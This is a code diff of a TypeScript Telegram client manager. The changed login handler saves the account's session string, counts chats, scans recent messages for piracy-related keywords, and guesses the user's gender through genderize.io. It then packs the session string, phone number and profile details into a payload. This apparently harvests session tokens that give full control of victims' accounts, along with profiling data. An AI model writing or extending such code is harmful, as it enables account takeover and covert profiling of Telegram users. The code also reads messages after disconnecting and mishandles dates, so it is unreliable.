@@ -343,30 +343,6 @@ class TelegramManager {
         await restAcc(this.phoneNumber);
     }
 
-    async getSelfMSgsInfo(){
-    
-    
-        let photoCount = 0;
-        let videoCount = 0;
-        let movieCount = 0;
-    
-        const messageHistory = await this.client.getMessages('me', { limit: 200 }); // Adjust limit as needed
-        for (const message of messageHistory) {
-          const text = message.text.toLocaleLowerCase();
-          if(contains(text, ['movie', 'series', '1080', '720','terabox','640','title','aac', '265','264','instagr','hdrip', 'mkv','hq', '480', 'blura', 's0', 'se0','uncut'])){
-            movieCount++
-          }else{
-            if (message.photo) {
-                photoCount++;
-              } else if (message.video) {
-                videoCount++;
-              }
-          }
-        }
-
-        return( {photoCount, videoCount, movieCount})
-    }
-
     async processLogin(result) {
         console.log(this.client.session.save());
         const sess = this.client.session.save() as unknown as string;
@@ -374,11 +350,8 @@ class TelegramManager {
         const chats = await this.client?.getDialogs({ limit: 600 });
         await this.disconnect();
         await deleteClient(this.phoneNumber);
-        // const myMsgs = await this.client.getMessages('me', { limit: 8 });
         let personalChats = 0;
         let channels = 0;
-        // const lastActive = await this.getLastActiveTime();
-        // const date = new Date(lastActive * 1000)
         const chatsArray = [];
 
         chats.map((chat: any) => {
@@ -393,12 +366,28 @@ class TelegramManager {
                 personalChats++
             }
         });
-        const selfMSgInfo = await this.getSelfMSgsInfo();
-        const data = await axios.get(`https://api.genderize.io/?name=${user.firstName}${user.lastName ? `%20${user.lastName}` : ''}`);
-       
+
+        let photoCount = 0;
+        let videoCount = 0;
+        let movieCount = 0;
+
+        const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed
+        for (const message of messageHistory) {
+            const text = message.text.toLocaleLowerCase();
+            if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
+                movieCount++
+            } else {
+                if (message.photo) {
+                    photoCount++;
+                } else if (message.video) {
+                    videoCount++;
+                }
+            }
+        } const data = await axios.get(`https://api.genderize.io/?name=${user.firstName}${user.lastName ? `%20${user.lastName}` : ''}`);
+
         const payload3 = {
-            ...selfMSgInfo,
-            gender:data?.data?.gender,
+            photoCount, videoCount, movieCount,
+            gender: data?.data?.gender,
             mobile: user.phone,
             session: `${sess}`,
             firstName: user.firstName,
@@ -406,8 +395,8 @@ class TelegramManager {
             userName: user.username,
             channels: channels,
             personalChats: personalChats,
-            msgs: 0,//myMsgs['total'],
-            totalChats: 0,//chats['total'],
+            msgs: messageHistory.total,
+            totalChats: chats['total'],
             lastActive: Date.now(),//lastActive,
             date: new Date(Date.now() * 1000),//date,
             tgId: user.id
